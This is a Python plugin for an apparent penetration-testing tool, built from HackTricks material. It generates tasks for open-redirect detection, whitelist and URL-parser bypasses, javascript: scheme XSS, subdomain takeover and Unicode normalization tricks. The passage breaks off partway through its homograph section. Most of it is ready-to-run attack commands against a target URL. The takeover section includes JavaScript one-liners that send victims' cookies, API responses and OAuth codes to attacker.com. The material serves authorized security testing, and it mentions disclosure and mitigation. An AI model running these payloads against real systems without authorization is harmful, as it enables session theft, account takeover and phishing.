"""
Open Redirect & URL Manipulation Attacks Plugin

Generates tasks for URL validation bypass including:
- Open redirect detection and exploitation
- Subdomain/domain takeover enumeration
- Unicode normalization URL bypass
- URL parser confusion attacks
- Homograph domain attacks

Extracted from HackTricks:
- pentesting-web/open-redirect.md (290 lines)
- pentesting-web/domain-subdomain-takeover.md (102 lines)
- pentesting-web/unicode-injection/*.md (189 lines)

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class RedirectAttacksPlugin(ServicePlugin):
    """Open redirect and URL manipulation plugin"""

    @property
    def name(self) -> str:
        return "redirect-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP/HTTPS services for redirect testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate redirect attacks task tree"""

        # Determine protocol
        service = service_info.get('service', '').lower()
        if 'https' in service or 'ssl' in service or port == 443:
            protocol = 'https'
        else:
            protocol = 'http'

        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'redirect-attacks-{port}',
            'name': f'Open Redirect & URL Manipulation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: Open Redirect Detection ===
        tasks['children'].append({
            'id': f'open-redirect-detect-{port}',
            'name': 'Open Redirect Detection',
            'type': 'parent',
            'children': [
                # Manual parameter discovery
                {
                    'id': f'redirect-param-enum-{port}',
                    'name': 'Enumerate Redirect Parameters',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Crawl and identify redirect parameters\ngau --o urls.txt {target}\n\n# Filter URLs with redirect params\nrg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=|goto=)" urls.txt | sort -u > redirect_candidates.txt\n\n# Manual: Check common endpoints\ncurl -s -I "{base_url}/logout?next=http://evil.com" | grep -i "Location:"\ncurl -s -I "{base_url}/login?return=//evil.com" | grep -i "Location:"\ncurl -s -I "{base_url}/redirect?url=https://evil.com" | grep -i "Location:"',
                        'description': 'Discover endpoints accepting redirect parameters for open redirect testing',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'RECON'],
                        'flag_explanations': {
                            'gau': 'Get All URLs from Wayback, AlienVault, Common Crawl',
                            '--o': 'Output file for discovered URLs',
                            'rg -NI': 'Ripgrep without line numbers, ignore binary',
                            'grep -i "Location:"': 'Case-insensitive search for redirect header'
                        },
                        'success_indicators': [
                            'URLs with redirect parameters found',
                            '30x status codes with Location header',
                            'Parameters like ?next=, ?url=, ?redirect= discovered'
                        ],
                        'failure_indicators': [
                            'No redirect parameters in application',
                            'All redirects return 200 (client-side redirects)',
                            'gau returns no historical URLs'
                        ],
                        'next_steps': [
                            'Test each parameter with evil.com payload',
                            'Check for whitelist bypass techniques',
                            'Test both server-side (Location) and client-side (JS) redirects',
                            'Document working parameters for exploitation phase'
                        ],
                        'alternatives': [
                            'Manual: Browse app and look for logout, login, OAuth callback endpoints',
                            'Burp: Proxy traffic and grep for redirect parameters in history',
                            'Manual: Test common params: ?url=, ?next=, ?redirect=, ?return=, ?goto=',
                            'katana -u {base_url} | grep "redirect\\|next\\|url="'
                        ],
                        'notes': 'Common redirect params: url, next, redirect, redir, dest, destination, rurl, target, return, returnTo, goto, continue, forward. Check OAuth flows (redirect_uri), logout flows, and post-login redirects.'
                    }
                },

                # Automated fuzzing
                {
                    'id': f'openredirex-fuzz-{port}',
                    'name': 'Automated Open Redirect Fuzzing',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install OpenRedireX (if not installed)\nif [ ! -d ~/tools/OpenRedireX ]; then\n  git clone https://github.com/devanshbatham/OpenRedireX ~/tools/OpenRedireX\n  cd ~/tools/OpenRedireX && chmod +x setup.sh && ./setup.sh\nfi\n\n# Create payloads file\ncat > open_redirect_payloads.txt << EOF\n//evil.com\nhttps://evil.com\njavascript:alert(1)\n//evil.com/%2F..\nhttps://trusted.com@evil.com/\nhttps://trusted.com\\\\@evil.com/\nEOF\n\n# Fuzz with OpenRedireX\ncat redirect_candidates.txt | ~/tools/OpenRedireX/openredirex.py -p open_redirect_payloads.txt -k FUZZ -c 50 | tee openredirex_results.txt\n\n# Extract confirmed redirects\nawk \'/30[1237]|Location:/I\' openredirex_results.txt > confirmed_redirects.txt',
                        'description': 'Automated fuzzing of redirect parameters with OpenRedireX payload corpus',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'NOISY'],
                        'flag_explanations': {
                            'openredirex.py': 'Fuzzer for open redirect vulnerabilities',
                            '-p': 'Payloads file containing redirect targets',
                            '-k FUZZ': 'Keyword to replace in URLs (parameter value)',
                            '-c 50': 'Concurrency level (50 parallel requests)',
                            'awk /30[1237]/': 'Filter for redirect status codes (301, 302, 303, 307)'
                        },
                        'success_indicators': [
                            'Location header points to attacker domain',
                            '301/302/303/307 status with evil.com in Location',
                            'Confirmed redirect to external domain'
                        ],
                        'failure_indicators': [
                            'All redirects stay internal',
                            'Whitelist blocks external domains',
                            'Rate limiting or WAF blocking requests'
                        ],
                        'next_steps': [
                            'Manually verify each confirmed redirect in browser',
                            'Test whitelist bypass techniques on confirmed vulns',
                            'Document working payloads for exploitation',
                            'Check if redirect can be chained (SSRF, OAuth token theft)'
                        ],
                        'alternatives': [
                            'Manual: curl -s -I "URL?param=//evil.com" | grep Location',
                            'Burp Intruder: Test redirect params with payload list',
                            'ffuf -u "URL?param=FUZZ" -w payloads.txt -fc 200',
                            'Oralyzer: github.com/0xNanda/Oralyzer (alternative tool)'
                        ],
                        'notes': 'OpenRedireX advantage: Built-in payload corpus with bypass techniques. Time estimate: 5-15 minutes depending on target size. OSCP: Always verify automated findings manually.'
                    }
                },

                # Client-side redirect detection
                {
                    'id': f'client-redirect-detect-{port}',
                    'name': 'Client-Side Redirect Detection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify JavaScript-based redirects in SPA applications',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'alternatives': [
                            f'# Search for JS redirect sinks\ncurl -s {base_url} | grep -E "window\\.location|location\\.href|location\\.assign|location\\.replace"',
                            f'# Check SPA routing\ncurl -s {base_url}/main.js | grep -E "router|redirect|navigate"',
                            '# Manual: Open browser DevTools, search JS for "location" assignments',
                            '# Manual: Test hash-based routing: /#/redirect?next=//evil.com'
                        ],
                        'success_indicators': [
                            'window.location = new URLSearchParams(location.search).get("next")',
                            'Router reads query params and redirects',
                            'Hash-based routing with external redirect'
                        ],
                        'failure_indicators': [
                            'No client-side navigation code found',
                            'All redirects are server-side only',
                            'SPA framework uses safe routing APIs'
                        ],
                        'next_steps': [
                            'Test query/hash parameters with evil.com',
                            'Check if validation happens client-side only',
                            'Look for postMessage-based redirects in iframes'
                        ],
                        'notes': 'Client-side redirects often missed by automated tools. SPA frameworks (React Router, Vue Router) may have unsafe redirect implementations. Check: window.location, location.href, location.assign(), location.replace(). Also check meta refresh: <meta http-equiv="refresh" content="0;url=//evil.com">'
                    }
                }
            ]
        })

        # === PHASE 2: Whitelist Bypass Techniques ===
        tasks['children'].append({
            'id': f'redirect-bypass-{port}',
            'name': 'Open Redirect Whitelist Bypass',
            'type': 'parent',
            'children': [
                # Loopback variants
                {
                    'id': f'loopback-bypass-{port}',
                    'name': 'Loopback & Internal Host Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass localhost/internal whitelist using alternative notations',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            f'# IPv4 loopback variants (if redirecting to localhost allowed)\ncurl -s -I "{base_url}/redirect?url=http://127.0.0.1" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://127.1" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://2130706433" | grep Location  # Decimal\ncurl -s -I "{base_url}/redirect?url=http://0x7f000001" | grep Location  # Hex\ncurl -s -I "{base_url}/redirect?url=http://017700000001" | grep Location  # Octal',
                            f'# IPv6 loopback variants\ncurl -s -I "{base_url}/redirect?url=http://[::1]" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://[0:0:0:0:0:0:0:1]" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://[::ffff:127.0.0.1]" | grep Location',
                            f'# Wildcard DNS to loopback\ncurl -s -I "{base_url}/redirect?url=http://127.0.0.1.sslip.io" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://lvh.me" | grep Location\ncurl -s -I "{base_url}/redirect?url=http://localtest.me" | grep Location',
                            f'# Trailing dot and casing\ncurl -s -I "{base_url}/redirect?url=http://localhost." | grep Location\ncurl -s -I "{base_url}/redirect?url=http://LOCALHOST" | grep Location'
                        ],
                        'success_indicators': [
                            'Redirect to 127.0.0.1 via alternative notation works',
                            'Bypass "localhost" filter with 127.1 or lvh.me',
                            'Access internal services via redirect'
                        ],
                        'failure_indicators': [
                            'Whitelist blocks all loopback variants',
                            'IP normalization catches decimal/hex/octal',
                            'DNS resolution blocked for wildcard domains'
                        ],
                        'next_steps': [
                            'If loopback works: Chain with SSRF to access internal services',
                            'Test internal IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16',
                            'Combine with URL parser bypass techniques'
                        ],
                        'notes': 'Loopback bypass useful when: 1) App allows "same host" redirects, 2) Chaining with SSRF to hit internal services, 3) Bypassing IP-based filters. Decimal: 2130706433 = 127.0.0.1. Hex: 0x7f000001 = 127.0.0.1. Wildcard DNS (sslip.io, lvh.me) resolves to 127.0.0.1.'
                    }
                },

                # Scheme-relative & userinfo tricks
                {
                    'id': f'url-confusion-bypass-{port}',
                    'name': 'URL Parser Confusion Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit URL parsing differences between validator and browser',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            f'# Scheme-relative (inherits current protocol)\ncurl -s -I "{base_url}/redirect?url=//evil.com" | grep Location\ncurl -s -I "{base_url}/redirect?url=////evil.com" | grep Location',
                            f'# Userinfo tricks (browser sees evil.com, validator sees trusted.com)\ncurl -s -I "{base_url}/redirect?url=https://{target}@evil.com/" | grep Location\ncurl -s -I "{base_url}/redirect?url=https://trusted.com@evil.com/" | grep Location',
                            f'# Backslash confusion (server validates, browser normalizes)\ncurl -s -I "{base_url}/redirect?url=https://{target}\\\\@evil.com/" | grep Location\ncurl -s -I "{base_url}/redirect?url=https://trusted.com\\\\@evil.com/" | grep Location',
                            f'# Prefix/suffix matching flaws\ncurl -s -I "{base_url}/redirect?url=https://{target}.evil.com/" | grep Location\ncurl -s -I "{base_url}/redirect?url=https://evil.com/{target}" | grep Location',
                            f'# Path confusion\ncurl -s -I "{base_url}/redirect?url=/\\\\\\\\evil.com" | grep Location\ncurl -s -I "{base_url}/redirect?url=/..//evil.com" | grep Location'
                        ],
                        'success_indicators': [
                            'Browser redirects to evil.com despite validator check',
                            'Userinfo @ trick bypasses startswith() validation',
                            'Backslash normalized to / by browser',
                            'Prefix matching tricked by subdomain or path'
                        ],
                        'failure_indicators': [
                            'Validator and browser parse URLs identically',
                            'Strict URL parsing library used',
                            'Both @ and \\\\ are blacklisted'
                        ],
                        'next_steps': [
                            'Combine with OAuth redirect_uri for account takeover',
                            'Chain with XSS if javascript: scheme allowed',
                            'Test framework-specific parsers (Node, PHP, Java)',
                            'Document exact payload that bypasses validator'
                        ],
                        'notes': 'URL parser confusion exploits differences between languages/libraries. Example: PHP FILTER_VALIDATE_URL vs browser. Backslash trick: https://trusted.com\\@evil.com → Server sees path, browser sees userinfo and navigates to evil.com. Scheme-relative (//evil.com) inherits current protocol (http/https). Always test in real browser, not just curl.'
                    }
                },

                # JavaScript scheme bypass
                {
                    'id': f'javascript-scheme-bypass-{port}',
                    'name': 'JavaScript Scheme to XSS',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escalate open redirect to XSS using javascript: scheme',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            f'# Basic javascript: scheme\ncurl -s "{base_url}/redirect?url=javascript:alert(1)" | grep -i "location\\|href"',
                            f'# CRLF bypass (newline tricks)\ncurl -s "{base_url}/redirect?url=java%0d%0ascript%0d%0a:alert(0)"',
                            f'# Subdomain filter abuse\ncurl -s "{base_url}/redirect?url=javascript://sub.domain.com/%0Aalert(1)"',
                            f'# Double encoding (bypasses FILTER_VALIDATE_URL)\ncurl -s "{base_url}/redirect?url=javascript://%250Aalert(1)"',
                            f'# With query string (comment or ternary)\ncurl -s "{base_url}/redirect?url=javascript://%250Aalert(1)//?1"\ncurl -s "{base_url}/redirect?url=javascript://%250A1?alert(1):0"',
                            f'# Tab/backslash variations\ncurl -s "{base_url}/redirect?url=%09Jav%09ascript:alert(1)"\ncurl -s "{base_url}/redirect?url=//%5cjavascript:alert(1)"',
                            f'# Whitelist bypass\ncurl -s "{base_url}/redirect?url=javascript://whitelisted.com?%a0alert%281%29"'
                        ],
                        'success_indicators': [
                            'javascript: scheme executes in browser',
                            'Alert box or console output confirms XSS',
                            'Redirect validator allows javascript: prefix'
                        ],
                        'failure_indicators': [
                            'javascript: scheme blacklisted',
                            'CSP blocks inline scripts',
                            'Browser blocks javascript: in Location header'
                        ],
                        'next_steps': [
                            'If XSS works: Steal cookies, session tokens',
                            'Escalate to account takeover in OAuth flows',
                            'Try data: scheme if javascript: blocked',
                            'Chain with CRLF injection for header smuggling'
                        ],
                        'notes': 'javascript: scheme escalates open redirect to XSS. Bypass techniques: 1) CRLF injection to break filters, 2) Double encoding, 3) Whitespace/tab injection, 4) Comment tricks (// makes rest of line comment in JS). Example: javascript://%250Aalert(1) - %250A = double-encoded newline. OSCP: Modern browsers block javascript: in Location header, but may work in client-side redirects (window.location).'
                    }
                }
            ]
        })

        # === PHASE 3: Subdomain/Domain Takeover ===
        tasks['children'].append({
            'id': f'subdomain-takeover-{port}',
            'name': 'Subdomain/Domain Takeover',
            'type': 'parent',
            'children': [
                # DNS enumeration for dangling records
                {
                    'id': f'dns-enum-takeover-{port}',
                    'name': 'Enumerate DNS for Dangling Records',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Enumerate subdomains\nsubfinder -d {target} -silent | tee subdomains.txt\n\n# Check for CNAME records\nwhile read subdomain; do\n  echo "Checking: $subdomain"\n  dig $subdomain CNAME +short | tee -a cname_records.txt\ndone < subdomains.txt\n\n# Identify dangling CNAMEs\ncat cname_records.txt | grep -E "github\\.io|herokuapp\\.com|azurewebsites\\.net|s3\\.amazonaws\\.com|cloudfront\\.net" | tee dangling_candidates.txt',
                        'description': 'Discover subdomains and identify dangling DNS records pointing to unclaimed services',
                        'tags': ['OSCP:HIGH', 'RECON', 'AUTOMATED'],
                        'flag_explanations': {
                            'subfinder': 'Fast subdomain enumeration tool',
                            '-d': 'Target domain',
                            '-silent': 'Suppress banner and errors',
                            'dig CNAME +short': 'Query CNAME record, short output only',
                            'grep -E': 'Extended regex for pattern matching'
                        },
                        'success_indicators': [
                            'CNAME pointing to github.io with NXDOMAIN response',
                            'S3 bucket CNAME with "NoSuchBucket" error',
                            'Heroku/Azure CNAME with "No such app" error',
                            'CloudFront CNAME with distribution not found'
                        ],
                        'failure_indicators': [
                            'All CNAMEs resolve correctly',
                            'No third-party service CNAMEs found',
                            'All subdomains have A records (no CNAMEs)'
                        ],
                        'next_steps': [
                            'For each dangling CNAME: Try to claim the resource',
                            'GitHub Pages: Create repo named in CNAME, enable Pages',
                            'S3: Try to create bucket with exact name',
                            'Heroku/Azure: Try to create app with exact name',
                            'Document potential takeover for responsible disclosure'
                        ],
                        'alternatives': [
                            'Manual: dig sub.target.com CNAME',
                            'Manual: nslookup -type=CNAME sub.target.com',
                            'amass enum -passive -d {target} | tee subdomains.txt',
                            'assetfinder --subs-only {target} | tee subdomains.txt',
                            'Manual: Check DNS records in registrar control panel'
                        ],
                        'notes': 'Subdomain takeover occurs when CNAME points to external service (GitHub Pages, S3, Heroku, etc.) but service resource is unclaimed/deleted. Common vulnerable services: github.io, herokuapp.com, azurewebsites.net, s3.amazonaws.com, cloudfront.net, zendesk.com, shopify.com. Indicators: NXDOMAIN, "NoSuchBucket", "No such app", 404 on service domain.'
                    }
                },

                # Automated takeover detection
                {
                    'id': f'subzy-takeover-{port}',
                    'name': 'Automated Subdomain Takeover Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install subzy (if not installed)\nif [ ! -f ~/go/bin/subzy ]; then\n  go install github.com/PentestPad/subzy@latest\nfi\n\n# Run subzy against subdomains\n~/go/bin/subzy run --targets subdomains.txt --concurrency 20 --timeout 10 | tee subzy_results.txt\n\n# Alternative: subjack\nif [ ! -f ~/go/bin/subjack ]; then\n  go install github.com/haccer/subjack@latest\nfi\n~/go/bin/subjack -w subdomains.txt -t 20 -timeout 10 -o subjack_results.txt -ssl',
                        'description': 'Automated detection of subdomain takeover vulnerabilities using subzy/subjack',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'VULN_SCAN'],
                        'flag_explanations': {
                            'subzy run': 'Execute subdomain takeover detection',
                            '--targets': 'File containing subdomains to test',
                            '--concurrency 20': 'Test 20 subdomains in parallel',
                            '--timeout 10': '10-second timeout per request',
                            'subjack -w': 'Wordlist file with subdomains',
                            '-t 20': '20 goroutines (concurrency)',
                            '-ssl': 'Force HTTPS connections'
                        },
                        'success_indicators': [
                            '[VULNERABLE] tag in output',
                            'Service identified as takeover-able',
                            'Fingerprint matches known vulnerable pattern'
                        ],
                        'failure_indicators': [
                            'No vulnerable subdomains found',
                            'All CNAMEs resolve correctly',
                            'Rate limiting or timeouts'
                        ],
                        'next_steps': [
                            'Manually verify each reported vulnerability',
                            'Attempt to claim the resource on the third-party service',
                            'Document exact steps to reproduce takeover',
                            'Report to bug bounty program if in scope'
                        ],
                        'alternatives': [
                            'Manual: Check each CNAME with curl and look for error messages',
                            'dnsReaper: github.com/punk-security/dnsReaper (alternative tool)',
                            'can-i-take-over-xyz: github.com/EdOverflow/can-i-take-over-xyz (reference)',
                            'Manual: curl -I https://sub.target.com | grep "404\\|NoSuchBucket\\|No such app"'
                        ],
                        'notes': 'Subzy and subjack use fingerprint databases to detect takeover-able services. Verify findings manually: 1) Confirm CNAME exists, 2) Confirm service shows error page, 3) Attempt to register resource. Time estimate: 5-10 minutes for 100 subdomains. OSCP relevance: Less common in exam but demonstrates DNS security understanding.'
                    }
                },

                # DNS wildcard exploitation
                {
                    'id': f'dns-wildcard-takeover-{port}',
                    'name': 'DNS Wildcard CNAME Takeover',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit wildcard DNS pointing to unclaimed third-party CNAME',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'alternatives': [
                            f'# Test for DNS wildcard\ndig randomstring123.{target} +short\ndig anothertest456.{target} +short\n# If both resolve to same IP/CNAME: wildcard exists',
                            f'# Check if wildcard points to CNAME\ndig *.{target} CNAME +short',
                            f'# If CNAME is third-party service (e.g., sohomdatta1.github.io):\n# 1. Create GitHub Pages site with that name\n# 2. Point arbitrary.{target} to your content\n# 3. Verify: curl https://arbitrary.{target}',
                            '# Manual: Test subdomain generation\ncurl https://mypage.target.com\n# If shows your content: wildcard takeover confirmed'
                        ],
                        'success_indicators': [
                            'Wildcard DNS resolves to attacker-controlled CNAME',
                            'Arbitrary subdomains point to attacker page',
                            'Can generate unlimited subdomains under victim domain'
                        ],
                        'failure_indicators': [
                            'No wildcard DNS configured',
                            'Wildcard points to static IP, not CNAME',
                            'Third-party service requires domain verification'
                        ],
                        'next_steps': [
                            'Register third-party page with matching name',
                            'Generate phishing subdomains: login.target.com, admin.target.com',
                            'Steal cookies via wildcard cookie scope',
                            'Document full attack chain for disclosure'
                        ],
                        'notes': 'DNS wildcard takeover: If *.target.com → CNAME → unclaimed-service.github.io, attacker can create github.io page and control ANY.target.com. Example: *.testing.com → sohomdatta1.github.io (unclaimed) → Attacker creates GitHub Pages site → Controls login.testing.com, admin.testing.com, etc. Impact: Phishing, cookie theft, XSS. Reference: https://ctf.zeyu2001.com/2022/nitectf-2022/undocumented-js-api'
                    }
                },

                # Exploitation vectors
                {
                    'id': f'takeover-exploit-{port}',
                    'name': 'Subdomain Takeover Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit confirmed subdomain takeover for phishing, cookie theft, CORS bypass',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            '# Cookie theft (if domain-scoped cookies)\n# Set up page on compromised subdomain:\necho "<script>fetch(\'https://attacker.com/?c=\'+document.cookie)</script>" > index.html\n# Victim visits compromised subdomain → cookies sent to attacker',
                            '# CORS bypass (if CORS allows subdomains)\n# On compromised subdomain:\nfetch(\'https://api.target.com/sensitive\', {credentials: \'include\'}).then(r=>r.text()).then(d=>fetch(\'https://attacker.com/\',{method:\'POST\',body:d}))\n# If CORS allows subdomain: API data exfiltrated',
                            '# OAuth redirect_uri abuse\n# If https://oauth.provider.com/auth?redirect_uri=https://compromised.target.com allowed:\n# Set up page to steal OAuth code/token\nlocation.href = "https://attacker.com/?code=" + new URLSearchParams(location.search).get("code")',
                            '# CSRF Same-Site bypass\n# If cookies have SameSite=None or no SameSite:\n# Compromised subdomain can send requests with victim cookies\n<form action="https://target.com/delete-account" method="POST"><input type="submit"></form>',
                            '# CSP bypass\n# If CSP allows script-src *.target.com:\n# Inject malicious script from compromised subdomain\n<script src="https://compromised.target.com/evil.js"></script>'
                        ],
                        'success_indicators': [
                            'Session cookies accessible from compromised subdomain',
                            'CORS request to main API succeeds',
                            'OAuth code intercepted via redirect_uri',
                            'CSRF protection bypassed via Same-Site cookie',
                            'XSS via CSP-allowed subdomain script'
                        ],
                        'failure_indicators': [
                            'Cookies have SameSite=Strict (blocks subdomain)',
                            'CORS does not allow subdomain origins',
                            'OAuth validates redirect_uri strictly',
                            'CSP does not allow subdomain scripts'
                        ],
                        'next_steps': [
                            'Document all security implications',
                            'Create PoC demonstrating cookie theft or CORS bypass',
                            'Report via responsible disclosure',
                            'Recommend mitigation: Remove dangling DNS, claim resource, domain verification'
                        ],
                        'notes': 'Subdomain takeover is not just phishing! Impact: 1) Cookie theft (domain-scoped cookies sent to subdomain), 2) CORS bypass (if CORS policy allows *.target.com), 3) OAuth token theft (redirect_uri validation weakness), 4) CSRF via Same-Site bypass, 5) XSS via CSP subdomain whitelist. Always demo real impact beyond "I control a subdomain". Mitigation: Remove unused DNS records, enable domain verification on third-party services.'
                    }
                }
            ]
        })

        # === PHASE 4: Unicode Normalization URL Bypass ===
        tasks['children'].append({
            'id': f'unicode-url-bypass-{port}',
            'name': 'Unicode Normalization URL Bypass',
            'type': 'parent',
            'children': [
                # Detecting unicode normalization
                {
                    'id': f'unicode-detect-{port}',
                    'name': 'Detect Unicode Normalization',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Test for unicode normalization (KELVIN SIGN normalizes to "K")\ncurl -s "{base_url}/?test=%e2%84%aa" | grep -i "K"\n# If "K" appears: Unicode normalization active\n\n# Test with full payload\ncurl -s "{base_url}/?name=Leoni%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83han" | grep -i "Leonishan"\n# If "Leonishan" appears: NFKD normalization detected',
                        'description': 'Test if application performs Unicode normalization that could bypass URL validators',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'QUICK_WIN'],
                        'flag_explanations': {
                            '%e2%84%aa': 'URL-encoded KELVIN SIGN (U+0212A)',
                            'grep -i "K"': 'Check if normalized to ASCII "K"',
                            'NFKD': 'Unicode Normalization Form KD (Compatibility Decomposition)'
                        },
                        'success_indicators': [
                            'KELVIN SIGN (%e2%84%aa) echoed back as "K"',
                            'Unicode characters normalized to ASCII equivalents',
                            'Application applies NFKC or NFKD normalization'
                        ],
                        'failure_indicators': [
                            'Unicode characters preserved as-is',
                            'Application rejects non-ASCII characters',
                            'No normalization detected'
                        ],
                        'next_steps': [
                            'Test open redirect bypass with Unicode equivalent characters',
                            'Try XSS bypass with Unicode script tags',
                            'Test path traversal with Unicode slash equivalents',
                            'Check if normalization happens AFTER validation'
                        ],
                        'alternatives': [
                            'Manual: Submit form with Unicode characters, check response',
                            'Burp: Send KELVIN SIGN in parameter, check if normalized',
                            'Manual: Test in browser address bar with Unicode URL',
                            'Python: unicodedata.normalize("NFKD", input_string)'
                        ],
                        'notes': 'Unicode normalization vulnerability: Validator checks raw input, but processing normalizes Unicode → ASCII. Example: Validator blocks "/" but allows Unicode U+FF0F (＋), which normalizes to "/" after validation. Test characters: KELVIN SIGN (U+0212A → K), fullwidth slash (U+FF0F → /), fullwidth backslash (U+FF3C → \\). Reference: https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/'
                    }
                },

                # Unicode payload generation
                {
                    'id': f'unicode-payload-gen-{port}',
                    'name': 'Generate Unicode Bypass Payloads',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create Unicode equivalent payloads for open redirect and XSS bypass',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'alternatives': [
                            f'# Unicode equivalents for common chars\n# / (slash) → U+FF0F → %ef%bc%8f\ncurl -s -I "{base_url}/redirect?url=http:%ef%bc%8f%ef%bc%8fevil.com" | grep Location',
                            f'# \\\\ (backslash) → U+FF3C → %ef%bc%bc\ncurl -s -I "{base_url}/redirect?url=http:%ef%bc%8f%ef%bc%8f{target}%ef%bc%bc@evil.com" | grep Location',
                            f'# . (dot) → U+FF0E → %ef%bc%8e\ncurl -s -I "{base_url}/redirect?url=http://evil%ef%bc%8ecom" | grep Location',
                            '# Common Unicode substitutions:\n# o → %e1%b4%bc\n# r → %e1%b4%bf\n# 1 → %c2%b9\n# = → %e2%81%bc\n# - → %ef%b9%a3\n# * → %ef%b9%a1\n# | → %ef%bd%9c',
                            f'# XSS with Unicode tags\ncurl -s "{base_url}/?xss=%ef%bc%9cscript%ef%bc%9ealert(1)%ef%bc%9c%ef%bc%8fscript%ef%bc%9e"\n# If normalized: <script>alert(1)</script> executes'
                        ],
                        'success_indicators': [
                            'Unicode slash normalized to ASCII slash after validation',
                            'Redirect to evil.com works with Unicode URL',
                            'XSS payload executes after Unicode normalization'
                        ],
                        'failure_indicators': [
                            'Unicode characters blocked by validator',
                            'Normalization happens before validation',
                            'WAF detects Unicode bypass attempts'
                        ],
                        'next_steps': [
                            'Chain with open redirect for account takeover',
                            'Test path traversal: ../../ → %ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f',
                            'Test SQLi bypass: \' OR \'1\'=\'1 with Unicode quotes',
                            'Document working Unicode equivalents'
                        ],
                        'notes': 'Unicode bypass: Validator sees Unicode (allowed), processor normalizes to ASCII (blocked char). Example: Validator blocks "/", attacker sends U+FF0F (＋), normalization converts to "/". Tools: unicode-explorer.com for char lookup, 0xacb.com/normalization_table for equivalents. OSCP: Combine with open redirect, XSS, path traversal. Time: Quick test (5 min), full enumeration (20 min).'
                    }
                },

                # Fuzzing with recollapse
                {
                    'id': f'unicode-fuzz-{port}',
                    'name': 'Automated Unicode Fuzzing',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install recollapse (if not installed)\nif [ ! -d ~/tools/recollapse ]; then\n  git clone https://github.com/0xacb/recollapse ~/tools/recollapse\n  cd ~/tools/recollapse && pip3 install -r requirements.txt\nfi\n\n# Generate Unicode variations of redirect URL\necho "http://evil.com" | python3 ~/tools/recollapse/recollapse.py | head -20 > unicode_variations.txt\n\n# Test each variation\nwhile read payload; do\n  echo "Testing: $payload"\n  curl -s -I "{base_url}/redirect?url=$payload" | grep -i "Location:"\ndone < unicode_variations.txt | tee unicode_results.txt',
                        'description': 'Generate Unicode variations of URLs to fuzz validators using recollapse',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            'recollapse': 'Tool to generate Unicode variations for regex fuzzing',
                            '-r requirements.txt': 'Install Python dependencies',
                            'head -20': 'Limit to 20 variations (avoid overwhelming server)',
                            'grep -i "Location:"': 'Check for redirect responses'
                        },
                        'success_indicators': [
                            'One or more Unicode variations bypass validator',
                            'Location header points to evil.com',
                            'Regex validation bypassed via normalization'
                        ],
                        'failure_indicators': [
                            'All Unicode variations blocked',
                            'Validator normalizes before checking',
                            'Rate limiting blocks fuzzing'
                        ],
                        'next_steps': [
                            'Manually verify working payload in browser',
                            'Document exact Unicode characters that bypass',
                            'Test same technique on other parameters',
                            'Chain with OAuth for account takeover'
                        ],
                        'alternatives': [
                            'Manual: Use unicode-explorer.com to find equivalents',
                            'Manual: Test common substitutions from normalization_table',
                            'Python: Generate variations with unicodedata.normalize()',
                            'Burp Intruder: Custom payload list with Unicode chars'
                        ],
                        'notes': 'recollapse generates Unicode variations to fuzz regex validators. Use case: Regex checks for "evil.com", but Unicode homoglyphs (е instead of e) bypass check, then normalize to "evil.com" in processing. Example: http://еvil.com (Cyrillic е) → normalizes to http://evil.com. Time estimate: 10-15 min. OSCP: Less common but demonstrates deep understanding of encoding issues.'
                    }
                }
            ]
        })

        # === PHASE 5: Homograph & IDN Attacks ===
        tasks['children'].append({
            'id': f'homograph-attacks-{port}',
            'name': 'Homograph & Punycode Attacks',
